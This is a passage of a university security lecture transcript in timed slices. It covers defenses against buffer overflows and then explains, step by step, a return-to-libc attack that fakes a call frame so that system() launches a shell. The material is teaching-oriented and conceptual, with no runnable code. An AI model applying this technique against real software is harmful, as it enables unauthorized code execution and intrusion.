              <text_slice>So it's very difficult
for the attacker</text_slice>
            </slice>
            <slice>
              <time_slice>30:16</time_slice>
              <text_slice>to figure out what exactly
to put into memory.</text_slice>
            </slice>
            <slice>
              <time_slice>30:18</time_slice>
              <text_slice>AUDIENCE: But if
he can get the code</text_slice>
            </slice>
            <slice>
              <time_slice>30:19</time_slice>
              <text_slice>and he also instructions
he can xor it back</text_slice>
            </slice>
            <slice>
              <time_slice>30:23</time_slice>
              <text_slice>to the instruction [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>30:24</time_slice>
              <text_slice>PROFESSOR;Oh yeah.</text_slice>
            </slice>
            <slice>
              <time_slice>30:25</time_slice>
              <text_slice>This is always a
canonical problem, right.</text_slice>
            </slice>
            <slice>
              <time_slice>30:26</time_slice>
              <text_slice>So it's like what if
someone does this?</text_slice>
            </slice>
            <slice>
              <time_slice>30:28</time_slice>
              <text_slice>So that's exactly right.</text_slice>
            </slice>
            <slice>
              <time_slice>30:29</time_slice>
              <text_slice>So this is somewhat similar to
what happens in the BROP attack</text_slice>
            </slice>
            <slice>
              <time_slice>30:31</time_slice>
              <text_slice>where, essentially we've sort of
randomized where locations are,</text_slice>
            </slice>
            <slice>
              <time_slice>30:35</time_slice>
              <text_slice>but the attacker can
do probes, right.</text_slice>
            </slice>
            <slice>
              <time_slice>30:37</time_slice>
              <text_slice>And figure out what's going on.</text_slice>
            </slice>
            <slice>
              <time_slice>30:38</time_slice>
              <text_slice>So you can imagine too that for
example, if the attacker knows</text_slice>
            </slice>
            <slice>
              <time_slice>30:41</time_slice>
              <text_slice>some sub-sequence of
code that he's expects</text_slice>
            </slice>
            <slice>
              <time_slice>30:44</time_slice>
              <text_slice>to be in the binary,
you could imagine</text_slice>
            </slice>
            <slice>
              <time_slice>30:46</time_slice>
              <text_slice>just sort of trying to xor the
binary with that known code,</text_slice>
            </slice>
            <slice>
              <time_slice>30:49</time_slice>
              <text_slice>trying to extract the key.</text_slice>
            </slice>
            <slice>
              <time_slice>30:50</time_slice>
              <text_slice>And there's a lot
evil in the world,</text_slice>
            </slice>
            <slice>
              <time_slice>30:51</time_slice>
              <text_slice>so you're exactly
correct about that.</text_slice>
            </slice>
            <slice>
              <time_slice>30:53</time_slice>
              <text_slice>OK so that's essentially
the discussion</text_slice>
            </slice>
            <slice>
              <time_slice>30:55</time_slice>
              <text_slice>of all the randomization attacks
that I want to discuss today.</text_slice>
            </slice>
            <slice>
              <time_slice>31:00</time_slice>
              <text_slice>So one thing to
talk about before we</text_slice>
            </slice>
            <slice>
              <time_slice>31:02</time_slice>
              <text_slice>get to some of the return
oriented programming stuff,</text_slice>
            </slice>
            <slice>
              <time_slice>31:04</time_slice>
              <text_slice>is you might wonder which
ones of these defenses</text_slice>
            </slice>
            <slice>
              <time_slice>31:06</time_slice>
              <text_slice>are actually used in practice.</text_slice>
            </slice>
            <slice>
              <time_slice>31:08</time_slice>
              <text_slice>And so as it turns out,
both GCC and Visual Studio,</text_slice>
            </slice>
            <slice>
              <time_slice>31:12</time_slice>
              <text_slice>they both enable stack
canaries by default, right.</text_slice>
            </slice>
            <slice>
              <time_slice>31:15</time_slice>
              <text_slice>So that's very popular, that's
a very well known community.</text_slice>
            </slice>
            <slice>
              <time_slice>31:19</time_slice>
              <text_slice>If you look Linux
and Windows they</text_slice>
            </slice>
            <slice>
              <time_slice>31:21</time_slice>
              <text_slice>can also do things like
non-executable memory.</text_slice>
            </slice>
            <slice>
              <time_slice>31:24</time_slice>
              <text_slice>They can also do things like
randomize the address space, so</text_slice>
            </slice>
            <slice>
              <time_slice>31:26</time_slice>
              <text_slice>that's also [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>31:27</time_slice>
              <text_slice>The baggy bounds stuff
however, is not as popular.</text_slice>
            </slice>
            <slice>
              <time_slice>31:30</time_slice>
              <text_slice>And that's because of
some of these costs</text_slice>
            </slice>
            <slice>
              <time_slice>31:31</time_slice>
              <text_slice>that we talked about
over here, in terms</text_slice>
            </slice>
            <slice>
              <time_slice>31:33</time_slice>
              <text_slice>of memory overhead, CPU, the
false alarms, and so on ans</text_slice>
            </slice>
            <slice>
              <time_slice>31:36</time_slice>
              <text_slice>so forth.</text_slice>
            </slice>
            <slice>
              <time_slice>31:38</time_slice>
              <text_slice>So that's basically a survey
of the state of the art,</text_slice>
            </slice>
            <slice>
              <time_slice>31:41</time_slice>
              <text_slice>in trying to prevent
these buffer overflows.</text_slice>
            </slice>
            <slice>
              <time_slice>31:45</time_slice>
              <text_slice>So now we're going to talk about
this return oriented programing</text_slice>
            </slice>
            <slice>
              <time_slice>31:50</time_slice>
              <text_slice>stuff.</text_slice>
            </slice>
            <slice>
              <time_slice>31:53</time_slice>
              <text_slice>So what I'm described to
you so far today in terms</text_slice>
            </slice>
            <slice>
              <time_slice>31:56</time_slice>
              <text_slice>of the address space
randomization and the data</text_slice>
            </slice>
            <slice>
              <time_slice>31:58</time_slice>
              <text_slice>execution prevention,
that's the-- the</text_slice>
            </slice>
            <slice>
              <time_slice>32:01</time_slice>
              <text_slice>read, write and execute
that I just described.</text_slice>
            </slice>
            <slice>
              <time_slice>32:03</time_slice>
              <text_slice>Those things are actually
very, very powerful, right.</text_slice>
            </slice>
            <slice>
              <time_slice>32:05</time_slice>
              <text_slice>Because the randomization
prevents the attacker</text_slice>
            </slice>
            <slice>
              <time_slice>32:07</time_slice>
              <text_slice>from actually understanding
where our hard coded addresses</text_slice>
            </slice>
            <slice>
              <time_slice>32:10</time_slice>
              <text_slice>are.</text_slice>
            </slice>
            <slice>
              <time_slice>32:10</time_slice>
              <text_slice>And the data
execution prevention</text_slice>
            </slice>
            <slice>
              <time_slice>32:11</time_slice>
              <text_slice>says, even if you can put
shell code into the stack,</text_slice>
            </slice>
            <slice>
              <time_slice>32:15</time_slice>
              <text_slice>then the attacker
can't just jump to it</text_slice>
            </slice>
            <slice>
              <time_slice>32:16</time_slice>
              <text_slice>and execute it, right.</text_slice>
            </slice>
            <slice>
              <time_slice>32:18</time_slice>
              <text_slice>So at its space,
that seems like,</text_slice>
            </slice>
            <slice>
              <time_slice>32:19</time_slice>
              <text_slice>man you've really
made a lot of progress</text_slice>
            </slice>
            <slice>
              <time_slice>32:21</time_slice>
              <text_slice>for stopping these attackers,
but of course there</text_slice>
            </slice>
            <slice>
              <time_slice>32:25</time_slice>
              <text_slice>are these hackers out there who
spend all their time thinking</text_slice>
            </slice>
            <slice>
              <time_slice>32:28</time_slice>
              <text_slice>about how to ruin our lives.</text_slice>
            </slice>
            <slice>
              <time_slice>32:29</time_slice>
              <text_slice>So what's the insight behind
return oriented programming?</text_slice>
            </slice>
            <slice>
              <time_slice>32:33</time_slice>
              <text_slice>The insight is that, what
if instead of the attacker</text_slice>
            </slice>
            <slice>
              <time_slice>32:35</time_slice>
              <text_slice>being able to generate just
new code at attack time, what</text_slice>
            </slice>
            <slice>
              <time_slice>32:39</time_slice>
              <text_slice>if the attacker could
string together preexisting</text_slice>
            </slice>
            <slice>
              <time_slice>32:42</time_slice>
              <text_slice>pieces of code and then string
them together in deviant ways,</text_slice>
            </slice>
            <slice>
              <time_slice>32:47</time_slice>
              <text_slice>right?</text_slice>
            </slice>
            <slice>
              <time_slice>32:47</time_slice>
              <text_slice>And we know that the program
contains a ton of code already,</text_slice>
            </slice>
            <slice>
              <time_slice>32:50</time_slice>
              <text_slice>right.</text_slice>
            </slice>
            <slice>
              <time_slice>32:50</time_slice>
              <text_slice>So hopefully, or unhopefully,
depending on which side of this</text_slice>
            </slice>
            <slice>
              <time_slice>32:53</time_slice>
              <text_slice>you're on.</text_slice>
            </slice>
            <slice>
              <time_slice>32:54</time_slice>
              <text_slice>If you can find enough
interesting code snippets,</text_slice>
            </slice>
            <slice>
              <time_slice>32:56</time_slice>
              <text_slice>you can string them
together to basically form</text_slice>
            </slice>
            <slice>
              <time_slice>32:59</time_slice>
              <text_slice>like this Turing
complete language, where</text_slice>
            </slice>
            <slice>
              <time_slice>33:01</time_slice>
              <text_slice>the attacker can essentially
do whatever the attacker wants</text_slice>
            </slice>
            <slice>
              <time_slice>33:03</time_slice>
              <text_slice>to do.</text_slice>
            </slice>
            <slice>
              <time_slice>33:04</time_slice>
              <text_slice>So that's the insight behind
return oriented programming.</text_slice>
            </slice>
            <slice>
              <time_slice>33:07</time_slice>
              <text_slice>So understand how this works.</text_slice>
            </slice>
            <slice>
              <time_slice>33:08</time_slice>
              <text_slice>Let's look at a very simple
example that will initially</text_slice>
            </slice>
            <slice>
              <time_slice>33:11</time_slice>
              <text_slice>start off very familiar, right.</text_slice>
            </slice>
            <slice>
              <time_slice>33:14</time_slice>
              <text_slice>But then it's very quickly
going to descend into madness.</text_slice>
            </slice>
            <slice>
              <time_slice>33:19</time_slice>
              <text_slice>So let's say that we have
the following program.</text_slice>
            </slice>
            <slice>
              <time_slice>33:23</time_slice>
              <text_slice>So we have some program-- sorry,
some function and conveniently</text_slice>
            </slice>
            <slice>
              <time_slice>33:29</time_slice>
              <text_slice>for the attacker, it has this
nice function here called</text_slice>
            </slice>
            <slice>
              <time_slice>33:33</time_slice>
              <text_slice>run shell.</text_slice>
            </slice>
            <slice>
              <time_slice>33:36</time_slice>
              <text_slice>So this is just
going to call system,</text_slice>
            </slice>
            <slice>
              <time_slice>33:38</time_slice>
              <text_slice>it's going to execute bin
slash bash and then be done.</text_slice>
            </slice>
            <slice>
              <time_slice>33:45</time_slice>
              <text_slice>And then we've got the canonical
buffer overflow process</text_slice>
            </slice>
            <slice>
              <time_slice>33:51</time_slice>
              <text_slice>or sorry, function down
here, basically this thing</text_slice>
            </slice>
            <slice>
              <time_slice>33:56</time_slice>
              <text_slice>is going to declare a
buffer, and then it's</text_slice>
            </slice>
            <slice>
              <time_slice>34:01</time_slice>
              <text_slice>going to use one of
these unsafe functions</text_slice>
            </slice>
            <slice>
              <time_slice>34:07</time_slice>
              <text_slice>to fill in bytes in the buffer.</text_slice>
            </slice>
            <slice>
              <time_slice>34:12</time_slice>
              <text_slice>OK so, we know that this
can be overflowing OK,</text_slice>
            </slice>
            <slice>
              <time_slice>34:17</time_slice>
              <text_slice>this is old news.</text_slice>
            </slice>
            <slice>
              <time_slice>34:18</time_slice>
              <text_slice>Now what's interesting is that
we have this function up here,</text_slice>
            </slice>
            <slice>
              <time_slice>34:22</time_slice>
              <text_slice>run shell, but it
doesn't quite seem</text_slice>
            </slice>
            <slice>
              <time_slice>34:26</time_slice>
              <text_slice>to be accessed in some direct
way based on this buffer</text_slice>
            </slice>
            <slice>
              <time_slice>34:29</time_slice>
              <text_slice>overflow.</text_slice>
            </slice>
            <slice>
              <time_slice>34:30</time_slice>
              <text_slice>So how can the attacker invoke
this run shell command here?</text_slice>
            </slice>
            <slice>
              <time_slice>34:35</time_slice>
              <text_slice>Well the attack may
do a couple things.</text_slice>
            </slice>
            <slice>
              <time_slice>34:38</time_slice>
              <text_slice>So first of all, the attacker
can disassemble the program,</text_slice>
            </slice>
            <slice>
              <time_slice>34:42</time_slice>
              <text_slice>run GDB, find out the address
of this thing in the executable,</text_slice>
            </slice>
            <slice>
              <time_slice>34:46</time_slice>
              <text_slice>right.</text_slice>
            </slice>
            <slice>
              <time_slice>34:47</time_slice>
              <text_slice>So you all should be very
familiar with doing those kinds</text_slice>
            </slice>
            <slice>
              <time_slice>34:48</time_slice>
              <text_slice>of things through the lab.</text_slice>
            </slice>
            <slice>
              <time_slice>34:50</time_slice>
              <text_slice>That's the first thing
the attacker can do.</text_slice>
            </slice>
            <slice>
              <time_slice>34:52</time_slice>
              <text_slice>And then during the
buffer overflow,</text_slice>
            </slice>
            <slice>
              <time_slice>34:54</time_slice>
              <text_slice>the attacker can essentially
take that address,</text_slice>
            </slice>
            <slice>
              <time_slice>34:57</time_slice>
              <text_slice>put it in the buffer
overflow that's generated</text_slice>
            </slice>
            <slice>
              <time_slice>35:00</time_slice>
              <text_slice>and make sure that the
function returns to run shell.</text_slice>
            </slice>
            <slice>
              <time_slice>35:04</time_slice>
              <text_slice>So just to make that clear,
let's draw that over here.</text_slice>
            </slice>
            <slice>
              <time_slice>35:09</time_slice>
              <text_slice>So, you have a setup
that looks something</text_slice>
            </slice>
            <slice>
              <time_slice>35:14</time_slice>
              <text_slice>like this at the bottom,
we have the buffer,</text_slice>
            </slice>
            <slice>
              <time_slice>35:20</time_slice>
              <text_slice>that's being overflowed.</text_slice>
            </slice>
            <slice>
              <time_slice>35:26</time_slice>
              <text_slice>And then up here, we have
the save the break pointer,</text_slice>
            </slice>
            <slice>
              <time_slice>35:36</time_slice>
              <text_slice>up here we have the return
address, for process message.</text_slice>
            </slice>
            <slice>
              <time_slice>35:48</time_slice>
              <text_slice>So remember that the new stack
pointer will be here initially,</text_slice>
            </slice>
            <slice>
              <time_slice>35:54</time_slice>
              <text_slice>when we start
executing the function.</text_slice>
            </slice>
            <slice>
              <time_slice>35:57</time_slice>
              <text_slice>This is the new
break pointer, this</text_slice>
            </slice>
            <slice>
              <time_slice>36:07</time_slice>
              <text_slice>is what the stack
pointer used to be.</text_slice>
            </slice>
            <slice>
              <time_slice>36:13</time_slice>
              <text_slice>And then we've got some
break pointer up here,</text_slice>
            </slice>
            <slice>
              <time_slice>36:19</time_slice>
              <text_slice>for the previous frame.</text_slice>
            </slice>
            <slice>
              <time_slice>36:25</time_slice>
              <text_slice>OK, so this should
look pretty familiar.</text_slice>
            </slice>
            <slice>
              <time_slice>36:27</time_slice>
              <text_slice>So basically, in the
attack, like I said,</text_slice>
            </slice>
            <slice>
              <time_slice>36:29</time_slice>
              <text_slice>we've used GDB to
figure out what</text_slice>
            </slice>
            <slice>
              <time_slice>36:31</time_slice>
              <text_slice>the address is of run shell.</text_slice>
            </slice>
            <slice>
              <time_slice>36:33</time_slice>
              <text_slice>So in the buffer overflow,
we can essentially just</text_slice>
            </slice>
            <slice>
              <time_slice>36:37</time_slice>
              <text_slice>put the address of run
shell right here, right.</text_slice>
            </slice>
            <slice>
              <time_slice>36:44</time_slice>
              <text_slice>So this is a actually pretty
straightforward extension</text_slice>
            </slice>
            <slice>
              <time_slice>36:46</time_slice>
              <text_slice>of what we already
know how to do, right.</text_slice>
            </slice>
            <slice>
              <time_slice>36:48</time_slice>
              <text_slice>So basically it's saying,
if we conveniently</text_slice>
            </slice>
            <slice>
              <time_slice>36:50</time_slice>
              <text_slice>have a command
that runs a shell,</text_slice>
            </slice>
            <slice>
              <time_slice>36:52</time_slice>
              <text_slice>if we can disassemble
the binary, figure out</text_slice>
            </slice>
            <slice>
              <time_slice>36:54</time_slice>
              <text_slice>where that address is, we can
just put that in this overflow</text_slice>
            </slice>
            <slice>
              <time_slice>36:57</time_slice>
              <text_slice>array that we have here.</text_slice>
            </slice>
            <slice>
              <time_slice>36:58</time_slice>
              <text_slice>So that should be
pretty straightforward.</text_slice>
            </slice>
            <slice>
              <time_slice>37:00</time_slice>
              <text_slice>Does that make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>37:02</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>37:03</time_slice>
              <text_slice>So, this was a very
childish example,</text_slice>
            </slice>
            <slice>
              <time_slice>37:07</time_slice>
              <text_slice>because the programmer
for some crazy reason</text_slice>
            </slice>
            <slice>
              <time_slice>37:09</time_slice>
              <text_slice>has put this low
hanging fruit here.</text_slice>
            </slice>
            <slice>
              <time_slice>37:12</time_slice>
              <text_slice>So as an attacker this is like
Christmas coming early, right.</text_slice>
            </slice>
            <slice>
              <time_slice>37:14</time_slice>
              <text_slice>Now it may not be the case
that you have something</text_slice>
            </slice>
            <slice>
              <time_slice>37:17</time_slice>
              <text_slice>as delightful as this.</text_slice>
            </slice>
            <slice>
              <time_slice>37:19</time_slice>
              <text_slice>So what you could have instead,
is something like this.</text_slice>
            </slice>
            <slice>
              <time_slice>37:25</time_slice>
              <text_slice>So let's say that instead
of this thing being called</text_slice>
            </slice>
            <slice>
              <time_slice>37:29</time_slice>
              <text_slice>run shell, we call it
run boring and then</text_slice>
            </slice>
            <slice>
              <time_slice>37:33</time_slice>
              <text_slice>maybe this thing just executes
bin slash OS let's say.</text_slice>
            </slice>
            <slice>
              <time_slice>37:41</time_slice>
              <text_slice>But let's say that everything
is not completely lost,</text_slice>
            </slice>
            <slice>
              <time_slice>37:47</time_slice>
              <text_slice>because we actually
have a string up here</text_slice>
            </slice>
            <slice>
              <time_slice>37:51</time_slice>
              <text_slice>that conveniently gives
us the path of that.</text_slice>
            </slice>
            <slice>
              <time_slice>38:04</time_slice>
              <text_slice>So what's interesting about
this is, that we can disassemble</text_slice>
            </slice>
            <slice>
              <time_slice>38:08</time_slice>
              <text_slice>the program, find the
location of run boring,</text_slice>
            </slice>
            <slice>
              <time_slice>38:11</time_slice>
              <text_slice>but as an attacker,
who wants to run an OS?</text_slice>
            </slice>
            <slice>
              <time_slice>38:13</time_slice>
              <text_slice>Right, that's no fun
But we do actually</text_slice>
            </slice>
            <slice>
              <time_slice>38:15</time_slice>
              <text_slice>have a string in memory that
points to the path of the shell</text_slice>
            </slice>
            <slice>
              <time_slice>38:21</time_slice>
              <text_slice>and actually we also know
something interesting too.</text_slice>
            </slice>
            <slice>
              <time_slice>38:24</time_slice>
              <text_slice>Which is that even though the
program isn't calling system</text_slice>
            </slice>
            <slice>
              <time_slice>38:27</time_slice>
              <text_slice>with the argument that we want,
it is calling system somehow.</text_slice>
            </slice>
            <slice>
              <time_slice>38:30</time_slice>
              <text_slice>So we know that
system must be getting</text_slice>
            </slice>
            <slice>
              <time_slice>38:32</time_slice>
              <text_slice>linked into this
program somehow, right.</text_slice>
            </slice>
            <slice>
              <time_slice>38:35</time_slice>
              <text_slice>So we can actually
leverage those two things,</text_slice>
            </slice>
            <slice>
              <time_slice>38:38</time_slice>
              <text_slice>to actually call system
with this argument here.</text_slice>
            </slice>
            <slice>
              <time_slice>38:42</time_slice>
              <text_slice>So the first thing that we
do, is we can go into GDB</text_slice>
            </slice>
            <slice>
              <time_slice>38:45</time_slice>
              <text_slice>and we can actually
figure out where</text_slice>
            </slice>
            <slice>
              <time_slice>38:48</time_slice>
              <text_slice>this thing is located in the
process binary image, right.</text_slice>
            </slice>
            <slice>
              <time_slice>38:52</time_slice>
              <text_slice>So you just go to GDB, just
type in basically print system</text_slice>
            </slice>
            <slice>
              <time_slice>38:55</time_slice>
              <text_slice>and I'll give you
some information</text_slice>
            </slice>
            <slice>
              <time_slice>38:56</time_slice>
              <text_slice>about the offset of that OK.</text_slice>
            </slice>
            <slice>
              <time_slice>38:57</time_slice>
              <text_slice>So that's pretty
straightforward.</text_slice>
            </slice>
            <slice>
              <time_slice>38:58</time_slice>
              <text_slice>You can also do the same
thing with bash path.</text_slice>
            </slice>
            <slice>
              <time_slice>39:00</time_slice>
              <text_slice>Right, you just use
GDB to figure out</text_slice>
            </slice>
            <slice>
              <time_slice>39:02</time_slice>
              <text_slice>where this thing lives.</text_slice>
            </slice>
            <slice>
              <time_slice>39:03</time_slice>
              <text_slice>It's statically
declared string, right.</text_slice>
            </slice>
            <slice>
              <time_slice>39:05</time_slice>
              <text_slice>So you'd be able to find
out where that lives.</text_slice>
            </slice>
            <slice>
              <time_slice>39:07</time_slice>
              <text_slice>And so once you've
done that, now you</text_slice>
            </slice>
            <slice>
              <time_slice>39:09</time_slice>
              <text_slice>got to do something a
little bit different, right.</text_slice>
            </slice>
            <slice>
              <time_slice>39:11</time_slice>
              <text_slice>Because now we actually
have to figure out somehow,</text_slice>
            </slice>
            <slice>
              <time_slice>39:14</time_slice>
              <text_slice>how to invoke system with
an argument of our choosing,</text_slice>
            </slice>
            <slice>
              <time_slice>39:18</time_slice>
              <text_slice>right.</text_slice>
            </slice>
            <slice>
              <time_slice>39:18</time_slice>
              <text_slice>And so the way that we do
that is by essentially faking</text_slice>
            </slice>
            <slice>
              <time_slice>39:21</time_slice>
              <text_slice>a calling frame for system.</text_slice>
            </slice>
            <slice>
              <time_slice>39:24</time_slice>
              <text_slice>OK, so remember that
a frame is the thing</text_slice>
            </slice>
            <slice>
              <time_slice>39:26</time_slice>
              <text_slice>that the compiler
and the hardware</text_slice>
            </slice>
            <slice>
              <time_slice>39:28</time_slice>
              <text_slice>work together to use to
implement the call stack,</text_slice>
            </slice>
            <slice>
              <time_slice>39:31</time_slice>
              <text_slice>right.</text_slice>
            </slice>
            <slice>
              <time_slice>39:31</time_slice>
              <text_slice>So here's basically
what we want to do.</text_slice>
            </slice>
            <slice>
              <time_slice>39:38</time_slice>
              <text_slice>We want to set up something
like this on the stack, right.</text_slice>
            </slice>
            <slice>
              <time_slice>39:50</time_slice>
              <text_slice>So basically we're
going to fake what</text_slice>
            </slice>
            <slice>
              <time_slice>39:53</time_slice>
              <text_slice>system would expect
to be on the stack,</text_slice>
            </slice>
            <slice>
              <time_slice>39:58</time_slice>
              <text_slice>but right before it
actually executes its code.</text_slice>
            </slice>
            <slice>
              <time_slice>40:05</time_slice>
              <text_slice>So up here we had the
argument of the system,</text_slice>
            </slice>
            <slice>
              <time_slice>40:07</time_slice>
              <text_slice>this is the string that we
actually want to execute.</text_slice>
            </slice>
            <slice>
              <time_slice>40:10</time_slice>
              <text_slice>And then down here, this is
where system should return to,</text_slice>
            </slice>
            <slice>
              <time_slice>40:19</time_slice>
              <text_slice>when it's done.</text_slice>
            </slice>
            <slice>
              <time_slice>40:23</time_slice>
              <text_slice>Right, so this is what system
expects the stack to look like,</text_slice>
            </slice>
            <slice>
              <time_slice>40:27</time_slice>
              <text_slice>right before it
starts execution.</text_slice>
            </slice>
            <slice>
              <time_slice>40:29</time_slice>
              <text_slice>It's going to say this is where
I should go when I'm finished,</text_slice>
            </slice>
            <slice>
              <time_slice>40:31</time_slice>
              <text_slice>this is the thing I should
consume as my argument, right.</text_slice>
            </slice>
            <slice>
              <time_slice>40:34</time_slice>
              <text_slice>In the past we've been
assuming that there</text_slice>
            </slice>
            <slice>
              <time_slice>40:35</time_slice>
              <text_slice>were no arguments when
you pass the functions,</text_slice>
            </slice>
            <slice>
              <time_slice>40:36</time_slice>
              <text_slice>but now this is a little
bit different, right.</text_slice>
            </slice>
            <slice>
              <time_slice>40:38</time_slice>
              <text_slice>So basically we
just have to ensure</text_slice>
            </slice>
            <slice>
              <time_slice>40:39</time_slice>
              <text_slice>that this thing is in that
overflow code that we create,</text_slice>
            </slice>
            <slice>
              <time_slice>40:44</time_slice>
              <text_slice>right.</text_slice>
            </slice>
            <slice>
              <time_slice>40:44</time_slice>
              <text_slice>We just have to make
sure this fake calling</text_slice>
            </slice>
            <slice>
              <time_slice>40:47</time_slice>
              <text_slice>frame is in that array.</text_slice>
            </slice>
            <slice>
              <time_slice>40:50</time_slice>
              <text_slice>So basically the
way this will work</text_slice>
            </slice>
            <slice>
              <time_slice>40:53</time_slice>
              <text_slice>is, we will do the following.</text_slice>
            </slice>
            <slice>
              <time_slice>40:59</time_slice>
              <text_slice>So once again remember
the overflow goes up here.</text_slice>
            </slice>
            <slice>
              <time_slice>41:02</time_slice>
              <text_slice>So first, we're going to put
the address of system here.</text_slice>
            </slice>
            <slice>
              <time_slice>41:15</time_slice>
              <text_slice>And then here, we're going
to put just some junk return</text_slice>
            </slice>
            <slice>
              <time_slice>41:20</time_slice>
              <text_slice>address.</text_slice>
            </slice>
            <slice>
              <time_slice>41:24</time_slice>
              <text_slice>Right, this is
where system's going</text_slice>
            </slice>
            <slice>
              <time_slice>41:26</time_slice>
              <text_slice>to return after it's finished.</text_slice>
            </slice>
            <slice>
              <time_slice>41:27</time_slice>
              <text_slice>For the purposes
of the discussion</text_slice>
            </slice>
            <slice>
              <time_slice>41:28</time_slice>
              <text_slice>now, we don't care
what this does,</text_slice>
            </slice>
            <slice>
              <time_slice>41:30</time_slice>
              <text_slice>we'll just make this be just
some random set of bytes.</text_slice>
            </slice>
            <slice>
              <time_slice>41:33</time_slice>
              <text_slice>And then up here,
we're actually going</text_slice>
            </slice>
            <slice>
              <time_slice>41:36</time_slice>
              <text_slice>to put the address
of bash path, right.</text_slice>
            </slice>
            <slice>
              <time_slice>41:46</time_slice>
              <text_slice>So what's going
to happen now when</text_slice>
            </slice>
            <slice>
              <time_slice>41:48</time_slice>
              <text_slice>we do this buffer in overflow?</text_slice>
            </slice>
            <slice>
              <time_slice>41:49</time_slice>
              <text_slice>So what's going to happen is
that, process message is going</text_slice>
            </slice>
            <slice>
              <time_slice>41:52</time_slice>
              <text_slice>to finish, it's
going to say, OK hey,</text_slice>
            </slice>
            <slice>
              <time_slice>41:54</time_slice>
              <text_slice>here's where I should
return to, right.</text_slice>
            </slice>
            <slice>
              <time_slice>41:56</time_slice>
              <text_slice>And then it's going to
pop the stack, right,</text_slice>
            </slice>
            <slice>
              <time_slice>42:00</time_slice>
              <text_slice>and now the system code
is executing, right.</text_slice>
            </slice>
            <slice>
              <time_slice>42:03</time_slice>
              <text_slice>The system code now sees
that fake call frame</text_slice>
            </slice>
            <slice>
              <time_slice>42:06</time_slice>
              <text_slice>that we created, right.</text_slice>
            </slice>
            <slice>
              <time_slice>42:08</time_slice>
              <text_slice>As far as system is
concerned, nothing chicanerous</text_slice>
            </slice>
            <slice>
              <time_slice>42:10</time_slice>
              <text_slice>has taken place, right.</text_slice>
            </slice>
            <slice>
              <time_slice>42:11</time_slice>
              <text_slice>System will say, aha
here's the argument</text_slice>
            </slice>
            <slice>
              <time_slice>42:13</time_slice>
              <text_slice>that I want to execute,
it's bin slash bash,</text_slice>
            </slice>
            <slice>
              <time_slice>42:16</time_slice>
              <text_slice>it's going to execute it
and voila, the attacker</text_slice>
            </slice>
            <slice>
              <time_slice>42:19</time_slice>
              <text_slice>has a shell, right.</text_slice>
            </slice>
            <slice>
              <time_slice>42:22</time_slice>
              <text_slice>So does this make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>42:23</time_slice>
              <text_slice>So basically what we've
done is, we've now</text_slice>
            </slice>
            <slice>
              <time_slice>42:25</time_slice>
              <text_slice>taken advantage of knowledge
of the calling convention,</text_slice>
            </slice>
            <slice>
              <time_slice>42:27</time_slice>
              <text_slice>for the platform to
create fake stack frames,</text_slice>
            </slice>
            <slice>
              <time_slice>42:30</time_slice>
              <text_slice>or fake calling
frames I should say.</text_slice>
            </slice>
            <slice>
              <time_slice>42:32</time_slice>
              <text_slice>And using those
fake calling frames,</text_slice>
            </slice>
            <slice>
              <time_slice>42:34</time_slice>
              <text_slice>we can actually execute any
function that is already linked</text_slice>
            </slice>
            <slice>
              <time_slice>42:38</time_slice>
              <text_slice>and defined in the application.</text_slice>
            </slice>
            <slice>
              <time_slice>42:42</time_slice>
              <text_slice>Does that make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>42:45</time_slice>
              <text_slice>OK so, another question
you might have is,</text_slice>
            </slice>
            <slice>
              <time_slice>42:52</time_slice>
              <text_slice>what if this string wasn't
actually in the program?</text_slice>
            </slice>
            <slice>
              <time_slice>42:57</time_slice>
              <text_slice>Now to be clear, this
string is almost certainly</text_slice>
            </slice>
            <slice>
              <time_slice>42:59</time_slice>
              <text_slice>in the program.</text_slice>
            </slice>
            <slice>
              <time_slice>43:00</time_slice>
              <text_slice>So that's one funny
thing about security,</text_slice>
            </slice>
            <slice>
              <time_slice>43:01</time_slice>
              <text_slice>there's just all kinds of fun
strings that are laying around,</text_slice>
            </slice>
            <slice>
              <time_slice>43:04</time_slice>
              <text_slice>you can just go to
town all day long.</text_slice>
            </slice>
            <slice>
              <time_slice>43:05</time_slice>
              <text_slice>Well let's suppose we
live in bizarro world</text_slice>
            </slice>
            <slice>
              <time_slice>43:07</time_slice>
              <text_slice>and like this string
is not in the program.</text_slice>
            </slice>
            <slice>
              <time_slice>43:09</time_slice>
              <text_slice>So does anyone have
any ideas about what</text_slice>
            </slice>
            <slice>
              <time_slice>43:11</time_slice>
              <text_slice>we could do to get that
string to be in the program?</text_slice>
            </slice>
            <slice>
              <time_slice>43:13</time_slice>
              <text_slice>AUDIENCE: We can put the
string on the [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>43:15</time_slice>
              <text_slice>PROFESSOR; Yes exactly,
don't trust that man.</text_slice>
            </slice>
            <slice>
              <time_slice>43:17</time_slice>
              <text_slice>That's what you can do, exactly.</text_slice>
            </slice>
            <slice>
              <time_slice>43:18</time_slice>
              <text_slice>So, what you can do
is actually for here,</text_slice>
            </slice>
            <slice>
              <time_slice>43:23</time_slice>
              <text_slice>have the address of bash path,
actually point here, right.</text_slice>
            </slice>
            <slice>
              <time_slice>43:29</time_slice>
              <text_slice>And then you'd put-- up here
you would put slash B-I-N</text_slice>
            </slice>
            <slice>
              <time_slice>43:35</time_slice>
              <text_slice>slash P-A-T slash 0.</text_slice>
            </slice>
            <slice>
              <time_slice>43:41</time_slice>
              <text_slice>So that's how you
can get around-- I</text_slice>
            </slice>
            <slice>
              <time_slice>43:43</time_slice>
              <text_slice>think I got that math right,
because each one of these</text_slice>
            </slice>
            <slice>
              <time_slice>43:45</time_slice>
              <text_slice>is 4 bytes.</text_slice>
            </slice>
            <slice>
              <time_slice>43:48</time_slice>
              <text_slice>But anyway, so you have the
pointer go up here and then</text_slice>
            </slice>
            <slice>
              <time_slice>43:51</time_slice>
              <text_slice>boom, you're done.</text_slice>
            </slice>
            <slice>
              <time_slice>43:52</time_slice>
              <text_slice>So now you can actually
conjure up arguments</text_slice>
            </slice>
            <slice>
              <time_slice>43:55</time_slice>
              <text_slice>just by putting them
in the shell code.</text_slice>
            </slice>
            <slice>
              <time_slice>44:00</time_slice>
              <text_slice>Pretty horrifying.</text_slice>
            </slice>
            <slice>
              <time_slice>44:02</time_slice>
              <text_slice>So this is all building up
